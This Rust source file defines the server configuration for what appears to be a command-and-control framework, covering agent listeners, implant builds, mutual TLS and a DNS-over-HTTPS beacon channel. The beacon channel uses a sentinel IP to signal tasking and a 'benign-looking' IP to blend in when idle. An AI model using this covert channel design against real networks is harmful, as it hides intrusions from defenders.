//! Server configuration loaded from a TOML file or built with defaults.

use serde::{Deserialize, Serialize};
use std::net::SocketAddr;
use std::path::PathBuf;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ServerConfig {
    /// Address the HTTPS dashboard / REST API listens on.
    pub http_addr: SocketAddr,
    /// Address the agent (AES-TCP) listener binds to.
    pub agent_addr: SocketAddr,
    /// Pre-shared secret used to derive the AES-256 key for the agent channel.
    /// In production this should be replaced by mTLS; see roadmap.
    pub agent_shared_secret: String,
    /// Bearer token operators must present in `Authorization: Bearer ...`.
    pub admin_token: String,
    /// Path to a JSON-Lines audit log (created if missing, append-only).
    pub audit_log_path: PathBuf,
    /// Optional TLS certificate (PEM). If `None`, a self-signed cert is
    /// generated in-memory at startup and printed to the log.
    pub tls_cert_path: Option<PathBuf>,
    /// Optional TLS private key (PEM).
    pub tls_key_path: Option<PathBuf>,
    /// Filesystem path to the static dashboard assets directory.
    pub static_dir: PathBuf,
    #[serde(default = "default_builds_dir")]
    pub builds_output_dir: PathBuf,
    #[serde(default = "default_build_retention_days")]
    pub build_retention_days: u32,
    #[serde(default = "default_max_concurrent_builds")]
    pub max_concurrent_builds: usize,
    /// How long (seconds) to wait for an agent to reply before timing out a command.
    #[serde(default = "default_command_timeout")]
    pub command_timeout_secs: u64,
    /// Enable the DNS-over-HTTPS bridge listener.
    #[serde(default)]
    pub doh_enabled: bool,
    /// Address the DoH listener binds to.
    #[serde(default = "default_doh_listen_addr")]
    pub doh_listen_addr: SocketAddr,
    /// Domain suffix expected in DoH query names.
    #[serde(default = "default_doh_domain")]
    pub doh_domain: String,
    /// Sentinel IP returned for beacon A queries when tasking is available.
    #[serde(default = "default_doh_beacon_sentinel")]
    pub doh_beacon_sentinel: String,
    /// Benign-looking IP returned for beacon A queries when no tasking exists.
    #[serde(default = "default_doh_idle_ip")]
    pub doh_idle_ip: String,
    // ── Mutual TLS (agent channel) ─────────────────────────────────────────
    /// When `true`, the agent-facing TCP listener requires client certificates.
    /// Defaults to `false` for backward compatibility.
    #[serde(default)]
    pub mtls_enabled: bool,
    /// Path to a PEM-encoded CA certificate used to verify agent client certs.
    /// Required when `mtls_enabled = true`.
    #[serde(default)]
    pub mtls_ca_cert_path: Option<PathBuf>,
    /// Allowed Common Names in agent client certificates.  When non-empty,
    /// only agents whose cert CN appears in this list are accepted.
    #[serde(default)]
    pub mtls_allowed_cns: Vec<String>,
    /// Allowed Organizational Units in agent client certificates.  When
    /// non-empty, the client cert's OU must appear in this list.
    #[serde(default)]
    pub mtls_allowed_ous: Vec<String>,
}

fn default_builds_dir() -> PathBuf {
    PathBuf::from("/var/lib/orchestra/builds")
}
fn default_build_retention_days() -> u32 {
    7
}
fn default_max_concurrent_builds() -> usize {
    1
}
fn default_command_timeout() -> u64 {
    30
}
fn default_doh_listen_addr() -> SocketAddr {
    "127.0.0.1:8445".parse().unwrap()
}
fn default_doh_domain() -> String {
    "c2.example.com".to_string()
}
fn default_doh_beacon_sentinel() -> String {
    "1.2.3.4".to_string()
}
fn default_doh_idle_ip() -> String {
    "104.18.5.22".to_string()
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            http_addr: "127.0.0.1:8443".parse().unwrap(),
            agent_addr: "127.0.0.1:8444".parse().unwrap(),
            agent_shared_secret: "change-me-pre-shared-secret".into(),
            admin_token: "change-me-admin-token".into(),
            audit_log_path: PathBuf::from("orchestra-audit.jsonl"),
            tls_cert_path: None,
            tls_key_path: None,
            static_dir: PathBuf::from("orchestra-server/static"),
            builds_output_dir: default_builds_dir(),
            build_retention_days: 7,
            max_concurrent_builds: 1,
            command_timeout_secs: 30,
            doh_enabled: false,
            doh_listen_addr: default_doh_listen_addr(),
            doh_domain: default_doh_domain(),
            doh_beacon_sentinel: default_doh_beacon_sentinel(),
            doh_idle_ip: default_doh_idle_ip(),
            mtls_enabled: false,
            mtls_ca_cert_path: None,
            mtls_allowed_cns: Vec::new(),
            mtls_allowed_ous: Vec::new(),
        }
    }
}

impl ServerConfig {
    pub fn load(path: &std::path::Path) -> anyhow::Result<Self> {
        let body = std::fs::read_to_string(path)?;
        Ok(toml::from_str(&body)?)
    }
}
